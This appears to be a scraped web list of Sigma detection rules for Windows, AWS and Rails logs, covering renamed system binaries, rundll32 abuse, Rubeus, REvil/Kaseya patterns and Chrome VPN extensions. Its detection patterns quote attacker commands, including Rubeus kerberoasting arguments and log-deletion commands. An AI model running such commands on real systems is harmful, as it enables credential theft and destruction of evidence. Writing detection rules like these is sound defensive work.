<li><a href="#">title:Renamed PowerShell id: d178a2d7-129a-4ba4-8ee6-d6e1fecd5d20 status: test description: Detects the execution of a renamed PowerShell often used by attackers or malware references: - author: Florian Roth, frack113 date: 2019/08/22 modified: 2021/07/03 tags: - car.2013-05-009 - attack.defense_evasion - attack.t1036.003 logsource: product: windows category: process_creation detection: selection: Description|startswith: - 'Windows PowerShell' - 'pwsh' Company: 'Microsoft Corporation' filter: Image|endswith: - '\powershell.exe' - '\powershell_ise.exe' - '\pwsh.exe' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Renamed Powershell Under Powershell Channel id: 30a8cb77-8eb3-4cfb-8e79-ad457c5a4592 description: Detects renamed powershell status: test references: - author: Harish Segar, frack113 date: 2020/06/29 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostName: ConsoleHost filter: HostApplication|startswith: - powershell.exe - C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe condition: selection and not filter falsepositives: - Unknown level: low 
<li><a href="#">title:Renamed ProcDump id: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67 status: test description: Detects the execution of a renamed ProcDump executable often used by attackers or malware references: - author: Florian Roth date: 2019/11/18 modified: 2021/08/16 tags: - attack.defense_evasion - attack.t1036.003 logsource: product: windows category: process_creation detection: selection1: OriginalFileName: 'procdump' selection2: CommandLine|contains|all: - ' -ma ' - ' -accepteula ' selection3: CommandLine|contains|all: - ' -ma ' - '.dmp' filter: Image|endswith: - '\procdump.exe' - '\procdump64.exe' condition: ( selection1 or selection2 or selection3 ) and not filter falsepositives: - Procdump illegaly bundled with legitimate software - Weird admins who renamed binaries level: high 
<li><a href="#">title:Renamed PsExec id: a7a7e0e5-1d57-49df-9c58-9fe5bc0346a2 status: test description: Detects the execution of a renamed PsExec often used by attackers or malware author: Florian Roth references: - date: 2019/05/21 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: Description: 'Execute processes remotely' Product: 'Sysinternals PsExec' filter: Image|endswith: - '\PsExec.exe' - '\PsExec64.exe' condition: selection and not filter falsepositives: - Software that illegaly integrates PsExec in a renamed form - Administrators that have renamed PsExec and no one knows why level: high tags: - car.2013-05-009 - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Renamed Rundll32.exe Execution id: d4d2574f-ac17-4d9e-b986-aeeae0dc8fe2 status: experimental description: Detects the execution of rundll32.exe that has been renamed to a different name to avoid detection references: - author: Florian Roth date: 2022/06/08 logsource: category: process_creation product: windows detection: selection: OriginalFileName: 'RUNDLL32.EXE' filter: Image|endswith: '\rundll32.exe' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Renamed SysInternals Debug View id: cd764533-2e07-40d6-a718-cfeec7f2da7f status: test description: Detects suspicious renamed SysInternals DebugView execution author: Florian Roth references: - date: 2020/05/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Product: - 'Sysinternals DebugView' - 'Sysinternals Debugview' filter: OriginalFileName: 'Dbgview.exe' Image|endswith: '\Dbgview.exe' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.resource_development - attack.t1588.002 
<li><a href="#">title:Renamed Whoami Execution id: f1086bf7-a0c4-4a37-9102-01e573caf4a0 status: experimental description: Detects the execution of whoami that has been renamed to a different name to avoid detection references: - - author: Florian Roth date: 2021/08/12 tags: - attack.discovery - attack.t1033 - car.2016-03-001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: 'whoami.exe' filter: Image|endswith: '\whoami.exe' condition: selection and not filter falsepositives: - Unknown level: critical 
<li><a href="#">title:Renamed ZOHO Dctask64 id: 340a090b-c4e9-412e-bb36-b4b16fe96f9b status: test description: Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation author: Florian Roth references: - - - date: 2020/01/28 modified: 2021/12/08 logsource: category: process_creation product: windows detection: selection: Hashes|contains: '6834B1B94E49701D77CCB3C0895E1AFD' filter: Image|endswith: '\dctask64.exe' condition: selection and not filter fields: - CommandLine - ParentCommandLine - ParentImage falsepositives: - Unknown yet level: high tags: - attack.defense_evasion - attack.t1036 - attack.t1055.001 - attack.t1202 - attack.t1218 
<li><a href="#">title:Replace Desktop Wallpaper by Powershell id: c5ac6a1e-9407-45f5-a0ce-ca9a0806a287 status: experimental author: frack113 date: 2021/12/26 description: | An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_1: ScriptBlockText|contains|all: - 'Get-ItemProperty' - 'Registry::' - 'HKEY_CURRENT_USER\Control Panel\Desktop\' - 'WallPaper' selection_2: ScriptBlockText|contains: SystemParametersInfo(20,0,*,3) condition: 1 of selection_* falsepositives: - Unknown level: low tags: - attack.impact - attack.t1491.001 
<li><a href="#">title:Replace.exe Usage id: 9292293b-8496-4715-9db6-37028dcda4b3 status: experimental description: Detects the use of Replace.exe which can be used to replace file with another file references: - - author: frack113 date: 2022/03/06 modified: 2022/06/22 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\replace.exe' argument: CommandLine|contains: - '/a' - '-a' condition: selection and argument falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Request A Single Ticket via PowerShell id: a861d835-af37-4930-bcd6-5b178bfb54df status: experimental description: | utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. A successful execution will output the SPNs for the endpoint in question. references: - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: System.IdentityModel.Tokens.KerberosRequestorSecurityToken condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1558.003 
<li><a href="#">title:Reset to Default Configuration Windows Firewall with Advanced Security id: 04b60639-39c0-412a-9fbe-e82499c881a3 status: experimental description: Windows Firewall has been reset to its default configuration. author: frack113 date: 2022/02/19 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: 2032 condition: selection level: low 
<li><a href="#">title:Restore Public AWS RDS Instance id: c3f265c7-ff03-4056-8ab2-d486227b4599 status: experimental description: Detects the recovery of a new public database instance from a snapshot. It may be a part of data exfiltration. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: rds.amazonaws.com responseElements.publiclyAccessible: 'true' eventName: RestoreDBInstanceFromDBSnapshot condition: selection_source falsepositives: - Unknown level: high tags: - attack.exfiltration - attack.t1020 
<li><a href="#">title:REvil Kaseya Incident Malware Patterns id: 5de632bc-7fbd-4c8a-944a-fce55c59eae5 status: test description: Detects process command line patterns and locations used by REvil group in Kaseya incident (can also match on other malware) references: - - - - - author: Florian Roth date: 2021/07/03 modified: 2022/05/20 tags: - attack.execution - attack.t1059 - attack.g0115 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'C:\Windows\cert.exe' - 'del /q /f c:\kworking\agent.crt' - 'Kaseya VSA Agent Hot-fix' - '\AppData\Local\Temp\MsMpEng.exe' - 'rmdir /s /q %SystemDrive%\inetpub\logs' - 'del /s /q /f %SystemDrive%\\*.log' - 'c:\kworking1\agent.exe' - 'c:\kworking1\agent.crt' selection2: Image: - 'C:\Windows\MsMpEng.exe' - 'C:\Windows\cert.exe' - 'C:\kworking\agent.exe' - 'C:\kworking1\agent.exe' selection3: CommandLine|contains|all: - 'del /s /q /f' - 'WebPages\Errors\webErrorLog.txt' condition: 1 of selection* falsepositives: - Unknown level: critical 
<li><a href="#">title:Root Certificate Installed id: 42821614-9264-4761-acfc-5772c3286f76 status: experimental description: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. references: - author: 'oscd.community, @redcanary, Zach Stanford @svch0st' date: 2020/10/10 modified: 2021/12/04 tags: - attack.defense_evasion - attack.t1553.004 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection1: ScriptBlockText|contains|all: - 'Move-Item' - 'Cert:\LocalMachine\Root' selection2: ScriptBlockText|contains|all: - 'Import-Certificate' - 'Cert:\LocalMachine\Root' condition: selection1 or selection2 level: medium falsepositives: - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP 
<li><a href="#">title:Root Certificate Installed id: 46591fae-7a4c-46ea-aec3-dff5e6d785dc related: - id: 42821614-9264-4761-acfc-5772c3286f76 type: derived status: experimental description: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. references: - author: 'oscd.community, @redcanary, Zach Stanford @svch0st' date: 2020/10/10 modified: 2021/09/21 tags: - attack.defense_evasion - attack.t1553.004 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\certutil.exe' # Example: certutil -addstore -f -user ROOT CertificateFileName.der CommandLine|contains|all: - '-addstore' - 'root' selection2: Image|endswith: '\CertMgr.exe' # Example: CertMgr.exe /add CertificateFileName.cer /s /r localMachine root /all CommandLine|contains|all: - '/add' - 'root' condition: selection1 or selection2 level: medium falsepositives: - Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP 
<li><a href="#">title:RottenPotato Like Attack Pattern id: 16f5d8ca-44bd-47c8-acbe-6fc95a16c12f status: experimental description: Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like references: - author: '@SBousseaden, Florian Roth' date: 2019/11/15 modified: 2021/07/07 tags: - attack.privilege_escalation - attack.credential_access - attack.t1557.001 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 3 TargetUserName: 'ANONYMOUS_LOGON' WorkstationName: '-' IpAddress: '127.0.0.1' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Rubeus Hack Tool id: 7ec2c172-dceb-4c10-92c9-87c1881b7e18 status: stable description: Detects the execution of the hacktool Rubeus via PE information of command line parameters author: Florian Roth references: - date: 2018/12/19 modified: 2022/05/23 logsource: category: process_creation product: windows detection: selection: - Image|endswith: Ëš\Rubeus.exe' - OriginalFileName: 'Rubeus.exe' - CommandLine|contains: - ' asreproast ' - ' dump /service:krbtgt ' - ' kerberoast ' - ' createnetonly /program:' - ' ptt /ticket:' - ' /impersonateuser:' - ' renew /ticket:' - ' asktgt /user:' - ' harvest /interval:' - ' s4u /user:' - ' s4u /ticket:' - ' hash /password:' condition: selection falsepositives: - Unlikely level: critical tags: - attack.credential_access - attack.t1003 - attack.t1558.003 - attack.lateral_movement - attack.t1550.003 
<li><a href="#">title:Ruby on Rails Framework Exceptions id: 0d2c3d4c-4b48-4ac3-8f23-ea845746bb1a status: stable description: Detects suspicious Ruby on Rails exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/06 modified: 2020/09/01 references: - - - - logsource: category: application product: ruby_on_rails detection: keywords: - ActionController::InvalidAuthenticityToken - ActionController::InvalidCrossOriginRequest - ActionController::MethodNotAllowed - ActionController::BadRequest - ActionController::ParameterMissing condition: keywords falsepositives: - Application bugs level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Run from a Zip File id: 1a70042a-6622-4a2b-8958-267625349abf status: experimental description: Payloads may be compressed, archived, or encrypted in order to avoid detection author: frack113 date: 2021/12/26 references: - logsource: category: process_creation product: windows detection: selection: Image|contains: '.zip\' condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1485 
<li><a href="#">title:Run Once Task Configuration in Registry id: c74d7efc-8826-45d9-b8bb-f04fac9e4eff status: test description: Rule to detect the configuration of Run Once registry key. Configured payload can be run by runonce.exe /AlternateShellStartup author: 'Avneet Singh @v3t0_, oscd.community' references: - - date: 2020/11/15 modified: 2022/04/04 logsource: product: windows category: registry_event detection: selection: TargetObject|startswith: 'HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components' TargetObject|endswith: '\StubPath' filter_chrome: Details|startswith: '"C:\Program Files\Google\Chrome\Application\' Details|endswith: '\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level' filter_edge: Details|startswith: - '"C:\Program Files (x86)\Microsoft\Edge\Application\' - '"C:\Program Files\Microsoft\Edge\Application\' Details|endswith: '\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable' condition: selection and not 1 of filter_* falsepositives: - Legitimate modification of the registry key by legitimate program level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Run Once Task Execution as Configured in Registry id: 198effb6-6c98-4d0c-9ea3-451fa143c45c status: test description: This rule detects the execution of Run Once task as configured in the registry author: 'Avneet Singh @v3t0_, oscd.community' references: - - date: 2020/10/18 modified: 2021/11/27 logsource: product: windows category: process_creation detection: process_name: Image|endswith: '\runonce.exe' process_description: Description: 'Run Once Wrapper' command_line: CommandLine|contains: ' /AlternateShellStartup' condition: (process_name or process_description) and command_line falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Run PowerShell Script from ADS id: 45a594aa-1fbd-4972-a809-ff5a99dd81b8 status: test description: Detects PowerShell script execution from Alternate Data Stream (ADS) author: Sergey Soldatov, Kaspersky Lab, oscd.community references: - date: 2019/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\powershell.exe' Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'Get-Content' - '-Stream' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.004 
<li><a href="#">title:Run PowerShell Script from Redirected Input Stream id: c83bf4b5-cdf0-437c-90fa-43d734f7c476 status: test description: Detects PowerShell script execution via input stream redirect author: Moriarty Meng (idea), Anton Kutepov (rule), oscd.community references: - - date: 2020/10/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_started: Image|endswith: '\powershell.exe' redirect_to_input_stream: CommandLine|re: '\s-\s*<' condition: powershell_started and redirect_to_input_stream falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.execution - attack.t1059 
<li><a href="#">title:Run Whoami as Privileged User id: 79ce34ca-af29-4d0e-b832-fc1b377020db status: experimental description: Detects a whoami.exe executed by privileged accounts that are often misused by threat actors references: - - author: Florian Roth date: 2022/01/28 modified: 2022/05/13 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection_user: User|contains: 'TrustedInstaller' selection_img: - OriginalFileName: 'whoami.exe' - Image|endswith: '\whoami.exe' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Run Whoami as SYSTEM id: 80167ada-7a12-41ed-b8e9-aa47195c66a1 status: experimental description: Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation. references: - author: Teymur Kheirkhabarov, Florian Roth date: 2019/10/23 modified: 2022/05/13 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection_user: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' selection_img: - OriginalFileName: 'whoami.exe' - Image|endswith: '\whoami.exe' condition: all of selection* falsepositives: - Possible name overlap with NT AUHTORITY substring to cover all languages level: high 
<li><a href="#">title:Run Whoami Showing Privileges id: 97a80ec7-0e2f-4d05-9ef4-65760e634f6b status: experimental description: Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privieleges. This is often used after a privilege escalation attempt. references: - author: Florian Roth date: 2021/05/05 modified: 2022/05/13 tags: - attack.privilege_escalation - attack.discovery - attack.t1033 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\whoami.exe' - OriginalFileName: 'whoami.exe' selection_cli: CommandLine|contains: '/priv' condition: all of selection* falsepositives: - Administrative activity (rare lookups on current privileges) level: high 
<li><a href="#">title:Rundll32 Execution Without DLL File id: c3a99af4-35a9-4668-879e-c09aeb4f2bdf status: experimental description: Detects the execution of rundll32 with a command line that doesn't contain a .dll file references: - author: Tim Shelton, Florian Roth date: 2022/01/13 modified: 2022/06/30 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' filter_empty: CommandLine: null filter: - CommandLine|contains: '.dll' - CommandLine: '' filter_iexplorer: ParentImage|endswith: ':\Program Files\Internet Explorer\iexplore.exe' CommandLine|contains: '.cpl' filter_msiexec_syswow64: ParentImage|endswith: ':\Windows\SysWOW64\msiexec.exe' CommandLine|startswith: 'C:\Windows\syswow64\MsiExec.exe -Embedding' filter_msiexec_system32: ParentImage|endswith: ':\Windows\System32\msiexec.exe' CommandLine|startswith: 'C:\Windows\system32\MsiExec.exe -Embedding' filter_splunk_ufw: ParentImage|endswith: ':\Windows\System32\cmd.exe' ParentCommandLine|contains: ' C:\Program Files\SplunkUniversalForwarder\' condition: selection and not 1 of filter* fields: - Image - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Rundll32 From Abnormal Drive id: d4ca7c59-e9e4-42d8-bf57-91a776efcb87 status: experimental description: Detects rundll32.exe executing from an abnormal drive such as a mounted ISO. author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io' date: 2022/01/25 modified: 2022/02/14 references: - tags: - attack.t1218.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' filter: - CurrentDirectory|contains: 'C:\' - CurrentDirectory: '' filter_null: CurrentDirectory: null condition: selection and not 1 of filter* falsepositives: - Rare false positives could occur on servers with multiple drives. level: medium 
<li><a href="#">title:Rundll32 InstallScreenSaver Execution id: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221 status: experimental description: An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver author: 'Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec' references: - date: 2022/04/28 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains: 'InstallScreenSaver' condition: selection falsepositives: - Legitimate installation of a new screensaver level: medium tags: - attack.t1218.011 - attack.defense_evasion 
<li><a href="#">title:Rundll32 Internet Connection id: cdc8da7d-c303-42f8-b08c-b4ab47230263 status: test description: Detects a rundll32 that communicates with public IP addresses author: Florian Roth references: - date: 2017/11/04 modified: 2022/04/29 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\rundll32.exe' Initiated: 'true' filter: - DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.' - '20.' # Microsoft range, caused some FPs - CommandLine|contains: - 'PcaSvc.dll,PcaPatchSdbTask' filter_update_processes: ParentImage: 'C:\Windows\System32\svchost.exe' RemoteAddress|endswith: ':443' condition: selection and not 1 of filter* falsepositives: - Communication to other corporate systems that use IP addresses from public address spaces level: medium tags: - attack.defense_evasion - attack.t1218.011 - attack.execution 
<li><a href="#">title:Rundll32 JS RunHTMLApplication Pattern id: 9f06447a-a33a-4cbe-a94f-a3f43184a7a3 status: experimental description: Detects suspicious command line patterns used when rundll32 is used to run JavaScript code author: Florian Roth date: 2022/01/14 references: - tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'rundll32' - 'javascript' - '..\..\mshtml,RunHTMLApplication' selection2: CommandLine|contains: ';document.write();GetObject("script' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Rundll32 Registered COM Objects id: f1edd233-30b5-4823-9e6a-c4171b24d316 status: experimental description: load malicious registered COM objects references: - - author: frack113 date: 2022/02/13 logsource: category: process_creation product: windows detection: selection: Image|endswith: \rundll32.exe CommandLine|contains: - '-sta ' - 'â€“localserver ' CommandLine|contains|all: - '{' - '}' condition: selection falsepositives: - Legitimate use level: high tags: - attack.privilege_escalation - attack.persistence - attack.t1546.015 
<li><a href="#">title:RunDLL32 Spawning Explorer id: caa06de8-fdef-4c91-826a-7f9e163eef4b description: Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way author: elhoim, CD_ROM_ status: experimental date: 2022/04/27 modified: 2022/05/25 references: - tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\rundll32.exe' Image|endswith: '\explorer.exe' filter: ParentCommandLine|contains: '\shell32.dll,Control_RunDLL' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Rundll32 With Suspicious Parent Process id: 1723e720-616d-4ddc-ab02-f7e3685a4713 description: Detects suspicious start of rundll32.exe with a parent process of Explorer.exe. Variant of Raspberry Robin, as first reported by Red Canary. status: experimental references: - author: CD_ROM_ date: 2022/05/21 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' ParentImage|endswith: '\explorer.exe' filter: CommandLine|contains: '\shell32.dll,OpenAs_RunDLL' condition: selection and not filter fields: - Image - ParentImage falsepositives: - Unknown level: medium tags: - attack.defense_evasion 
<li><a href="#">title:Rundll32 Without Parameters id: 5bb68627-3198-40ca-b458-49f973db8752 status: experimental description: Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module author: Bartlomiej Czyz, Relativity date: 2021/01/31 references: - tags: - attack.lateral_movement - attack.t1021.002 - attack.t1570 - attack.execution - attack.t1569.002 logsource: category: process_creation product: windows detection: selection: CommandLine: 'rundll32.exe' condition: selection fields: - ComputerName - SubjectUserName - CommandLine - Image - ParentImage falsepositives: - Unknown level: high 
<li><a href="#">title:Running Chrome VPN Extensions via the Registry 2 VPN Extension id: b64a026b-8deb-4c1d-92fd-98893209dff1 description: Running Chrome VPN Extensions via the Registry install 2 vpn extension author: frack113 date: 2021/12/28 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: chrome_ext: TargetObject|contains: 'Software\Wow6432Node\Google\Chrome\Extensions' TargetObject|endswith: 'update_url' EventType: SetValue chrome_vpn: TargetObject|contains: - fdcgdnkidjaadafnichfpabhfomcebme # ZenMate VPN - fcfhplploccackoneaefokcmbjfbkenj # 1clickVPN - bihmplhobchoageeokmgbdihknkjbknd # Touch VPN - gkojfkhlekighikafcpjkiklfbnlmeio # Hola Free VPN - jajilbjjinjmgcibalaakngmkilboobh # Astar VPN - gjknjjomckknofjidppipffbpoekiipm # VPN Free - nabbmpekekjknlbkgpodfndbodhijjem # Earth VPN - kpiecbcckbofpmkkkdibbllpinceiihk # DotVPN - nlbejmccbhkncgokjcmghpfloaajcffj # Hotspot Shield Free VPN - omghfjlpggmjjaagoclmmobgdodcjboh # Browsec VPN - bibjcjfmgapbfoljiojpipaooddpkpai # VPN-free.pro - mpcaainmfjjigeicjnlkdfajbioopjko # VPN Unlimited Free - jljopmgdobloagejpohpldgkiellmfnc # PP VPN - lochiccbgeohimldjooaakjllnafhaid # IP Unblock - nhnfcgpcbfclhfafjlooihdfghaeinfc # Surf VPN - ookhnhpkphagefgdiemllfajmkdkcaim # iNinja VPN - namfblliamklmeodpcelkokjbffgmeoo # Daily VPN - nbcojefnccbanplpoffopkoepjmhgdgh # Hoxx VPN Proxy - majdfhpaihoncoakbjgbdhglocklcgno # Free VPN - lnfdmdhmfbimhhpaeocncdlhiodoblbd # VPN PROXY MASTER - eppiocemhmnlbhjplcgkofciiegomcon # Urban Free VPN - cocfojppfigjeefejbpfmedgjbpchcng # SaferVPN Proxy - foiopecknacmiihiocgdjgbjokkpkohc # VPN Professional - hhdobjgopfphlmjbmnpglhfcgppchgje # AdGuard VPN - jgbaghohigdbgbolncodkdlpenhcmcge # Free VPN - inligpkjkhbpifecbdjhmdpcfhnlelja # Free One Touch VPN - higioemojdadgdbhbbbkfbebbdlfjbip # Unlimited VPN & Proxy by ibVPN - hipncndjamdcmphkgngojegjblibadbe # RusVPN - iolonopooapdagdemdoaihahlfkncfgg # Azino VPN - nhfjkakglbnnpkpldhjmpmmfefifedcj # Pron VPN - jpgljfpmoofbmlieejglhonfofmahini # Free Residential VPN - fgddmllnllkalaagkghckoinaemmogpe # ExpressVPN - ejkaocphofnobjdedneohbbiilggdlbi # Hotspot Shield Elite VPN Proxy - keodbianoliadkoelloecbhllnpiocoi # Hide My IP VPN - hoapmlpnmpaehilehggglehfdlnoegck # Tunnello VPN - poeojclicodamonabcabmapamjkkmnnk # HMA VPN Proxy Unblocker - dfkdflfgjdajbhocmfjolpjbebdkcjog # Free Avira Phantom VPN - kcdahmgmaagjhocpipbodaokikjkampi # Hola VPN - klnkiajpmpkkkgpgbogmcgfjhdoljacg # Free VPN for Chrome - lneaocagcijjdpkcabeanfpdbmapcjjg # Hub VPN - pgfpignfckbloagkfnamnolkeaecfgfh # Free Proxy VPN - jplnlifepflhkbkgonidnobkakhmpnmh # Private Internet Access - jliodmnojccaloajphkingdnpljdhdok # Turbo VPN for PC - hnmpcagpplmpfojmgmnngilcnanddlhb # Windscribe - ffbkglfijbcbgblgflchnbphjdllaogb # CyberGhost VPN - kcndmbbelllkmioekdagahekgimemejo # VPN.AC - jdgilggpfmjpbodmhndmhojklgfdlhob # Browser VPN - bihhflimonbpcfagfadcnbbdngpopnjb # DEEPRISM VPN - ppajinakbfocjfnijggfndbdmjggcmde # My Browser Vpn - oofgbpoabipfcfjapgnbbjjaenockbdp # SetupVPN - bhnhkdgoefpmekcgnccpnhjfdgicfebm # Wachee VPN - knmmpciebaoojcpjjoeonlcjacjopcpf # Thunder Proxy - dhadilbmmjiooceioladdphemaliiobo # Free Proxy VPN - jedieiamjmoflcknjdjhpieklepfglin # FastestVPN Proxy - mhngpdlhojliikfknhfaglpnddniijfh # WorkingVPN - omdakjcmkglenbhjadbccaookpfjihpa # TunnelBear VPN - npgimkapccfidfkfoklhpkgmhgfejhbj # BelkaVPN - akeehkgglkmpapdnanoochpfmeghfdln # VPN Master - gbmdmipapolaohpinhblmcnpmmlgfgje # Unblock Websites - aigmfoeogfnljhnofglledbhhfegannp # Lethean Proxy VPN - cgojmfochfikphincbhokimmmjenhhgk # Whoer VPN - ficajfeojakddincjafebjmfiefcmanc # Best VPN USA - ifnaibldjfdmaipaddffmgcmekjhiloa # FREE VPN DEWELOPMENT - jbnmpdkcfkochpanomnkhnafobppmccn # apkfold free vpn - apcfdffemoinopelidncddjbhkiblecc # Soul VPN - mjolnodfokkkaichkcjipfgblbfgojpa # DotVPN - oifjbnnafapeiknapihcmpeodaeblbkn # rderzh VPN Proxy - plpmggfglncceinmilojdkiijhmajkjh # Red Panda VPN - mjnbclmflcpookeapghfhapeffmpodij # Ultrareach VPN - bblcccknbdbplgmdjnnikffefhdlobhp # FastStunnel VPN - aojlhgbkmkahabcmcpifbolnoichfeep # VirtualShield VPN - lcmammnjlbmlbcaniggmlejfjpjagiia # Adblock Office VPN Proxy Server - knajdeaocbpmfghhmijicidfcmdgbdpm # Guru VPN & Proxy - bdlcnpceagnkjnjlbbbcepohejbheilk # Malus VPN - edknjdjielmpdlnllkdmaghlbpnmjmgb # Muscle VPN - eidnihaadmmancegllknfbliaijfmkgo # Push VPN - ckiahbcmlmkpfiijecbpflfahoimklke # Gom VPN - macdlemfnignjhclfcfichcdhiomgjjb # Free Fast VPN - chioafkonnhbpajpengbalkececleldf # BullVPN - amnoibeflfphhplmckdbiajkjaoomgnj # HideAll VPN - llbhddikeonkpbhpncnhialfbpnilcnc # ProxyFlow - pcienlhnoficegnepejpfiklggkioccm # Cloud VPN - iocnglnmfkgfedpcemdflhkchokkfeii # sVPN - igahhbkcppaollcjeaaoapkijbnphfhb # Social VPN - njpmifchgidinihmijhcfpbdmglecdlb # Trellonet Trellonet - ggackgngljinccllcmbgnpgpllcjepgc # WindmillVPN - kchocjcihdgkoplngjemhpplmmloanja # IPBurger Proxy & VPN - bnijmipndnicefcdbhgcjoognndbgkep # Veee - lklekjodgannjcccdlbicoamibgbdnmi # Anonymous Proxy Vpn Browser - dbdbnchagbkhknegmhgikkleoogjcfge # Hideman VPN - egblhcjfjmbjajhjhpmnlekffgaemgfh # Fornex VPN - ehbhfpfdkmhcpaehaooegfdflljcnfec # WeVPN - bkkgdjpomdnfemhhkalfkogckjdkcjkg # VPNMatic - almalgbpmcfpdaopimbdchdliminoign # Urban Shield - akkbkhnikoeojlhiiomohpdnkhbkhieh # Prime VPN - gbfgfbopcfokdpkdigfmoeaajfmpkbnh # westwind - bniikohfmajhdcffljgfeiklcbgffppl # Upnet - lejgfmmlngaigdmmikblappdafcmkndb # uVPN - ffhhkmlgedgcliajaedapkdfigdobcif # Nucleus VPN - gcknhkkoolaabfmlnjonogaaifnjlfnp # FoxyProxy Standard - pooljnboifbodgifngpppfklhifechoe # GeoProxy - fjoaledfpmneenckfbpdfhkmimnjocfa # NordVPN - aakchaleigkohafkfjfjbblobjifikek # ProxFlow - dpplabbmogkhghncfbfdeeokoefdjegm # Proxy SwitchySharp - padekgcemlokbadohgkifijomclgjgif # Proxy SwitchyOmega - bfidboloedlamgdmenmlbipfnccokknp # PureVPN condition: all of chrome_* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1133 
<li><a href="#">title:RunXCmd Tool Execution As System id: 93199800-b52a-4dec-b762-75212c196542 status: experimental description: Detects the use of RunXCmd tool for command execution author: Florian Roth date: 2022/01/24 references: - - tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' /account=system ' - '/exec=' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate use by administrators level: high 
